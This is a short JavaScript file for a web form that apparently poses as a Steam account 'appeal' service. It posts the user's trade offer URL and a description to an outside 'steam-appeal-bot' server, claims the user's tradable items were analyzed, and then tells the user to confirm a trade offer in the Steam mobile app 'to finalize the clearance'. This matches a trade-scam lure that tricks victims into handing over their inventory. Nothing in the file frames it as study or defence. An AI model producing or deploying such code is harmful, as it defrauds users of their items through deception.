// Check if the provided trade URL is valid
function isValidSteamTradeURL(url) {
  return url.includes("steamcommunity.com/tradeoffer");
}

// Submit the appeal form
function submitAppeal() {
  const tradeUrl = document.getElementById("tradeUrl").value.trim();
  if (!isValidSteamTradeURL(tradeUrl)) {
    alert("⚠️ Please enter a valid Steam trade offer URL.");
    return;
  }
  document.getElementById("modal").style.display = "flex"; // Show the modal
}

// Confirm the understanding by the user
function confirmUnderstanding() {
  document.getElementById("modal").style.display = "none"; // Hide the modal

  const description = document.getElementById("descriptionBox").value.trim();
  const tradeUrl = document.getElementById("tradeUrl").value.trim();

  // Send appeal data to the backend
  fetch("https://steam-appeal-bot-1.onrender.com/api/submit-appeal", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      description: description,
      tradeUrl: tradeUrl
    })
  })
  .then(res => res.json())
  .then(data => {
    if (data.success) {
      alert(`✅ Appeal submitted successfully! ${data.itemsCount} tradable items were analyzed.`);
      // Show instructions after offer is sent
      alert("💡 How to accept and confirm your offer:\n1. Go to your Steam inventory.\n2. Open the trade offer.\n3. Confirm the offer on your Steam mobile app to finalize the clearance.");
    } else {
      alert("⚠️ Something went wrong. Please try again.");
    }
  })
  .catch(err => {
    alert("❌ Server error. Please try again later.");
    console.error(err);
  });
}
